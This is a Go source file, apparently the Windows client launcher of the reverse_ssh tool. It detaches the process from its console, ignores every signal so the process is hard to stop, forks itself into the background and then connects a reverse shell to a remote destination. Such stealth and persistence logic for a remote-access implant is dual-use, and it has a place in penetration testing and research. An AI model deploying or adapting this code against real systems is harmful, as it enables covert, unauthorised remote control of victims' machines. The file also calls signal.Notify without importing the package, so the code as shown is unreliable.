//go:build windows
// +build windows

package main

import (
	"log"
	"os"
	"os/exec"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func runOrFork(destination, fingerprint, proxyaddress string, fg, dt, rc bool) {
	if fg || dt {
		if dt {
			modkernel32 := syscall.NewLazyDLL("kernel32.dll")
			procAttachConsole := modkernel32.NewProc("FreeConsole")
			syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)
		}
		// Set up channel on which to send signal notifications.
		// We must use a buffered channel or risk missing the signal
		// if we're not ready to receive when the signal is sent.
		c := make(chan os.Signal, 1)

		// Passing no signals to Notify means that
		// all signals will be sent to the channel.
		signal.Notify(c)

		// Block until any signal is received.
		go func() {
			for range c {
				// Ignore all signals. Because yes
			}
		}()
		client.Run(destination, fingerprint, proxyaddress, rc)
		return
	}

	cmd := exec.Command(os.Args[0], append([]string{"--detach"}, os.Args[1:]...)...)
	cmd.Start()
	cmd.Process.Release()
	log.Println("Forking")
}
